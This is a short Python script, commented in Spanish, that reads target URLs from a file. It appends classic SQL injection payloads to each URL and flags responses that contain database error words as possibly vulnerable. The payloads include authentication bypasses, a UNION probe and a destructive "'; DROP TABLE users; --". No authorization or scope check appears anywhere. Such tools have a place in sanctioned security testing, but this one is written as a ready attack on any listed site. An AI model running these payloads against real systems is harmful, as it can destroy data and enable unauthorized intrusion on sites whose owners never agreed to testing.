# sql injection scanner

import requests

# Lista de payloads clásicos de SQL Injection
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "' UNION SELECT null,null --",
    "' OR 'a'='a"
]

# Palabras clave para detectar comportamiento anómalo
indicadores = ["mysql", "sql", "syntax", "error", "warning", "unexpected"]

# Leer las URLs objetivo desde un archivo de texto
with open("targets.txt", "r") as file:
    urls = [line.strip() for line in file.readlines() if line.strip()]

print("Iniciando escaneo automatizado de inyecciones SQL...\n")

# Recorrer cada URL y probar cada payload
for url in urls:
    vulnerable = False
    for payload in payloads:
        try:
            prueba = url + payload
            response = requests.get(prueba, timeout=5)
            contenido = response.text.lower()
            if any(palabra in contenido for palabra in indicadores):
                print(f"[+] Posible SQLi en: {prueba}")
                vulnerable = True
                break  # No probar más payloads si ya se sospecha vulnerabilidad
        except requests.RequestException as e:
            print(f"[!] Error al acceder a: {url} - {str(e)}")
    if not vulnerable:
        print(f"[-] {url} parece no vulnerable.")

print("\nEscaneo completado.")
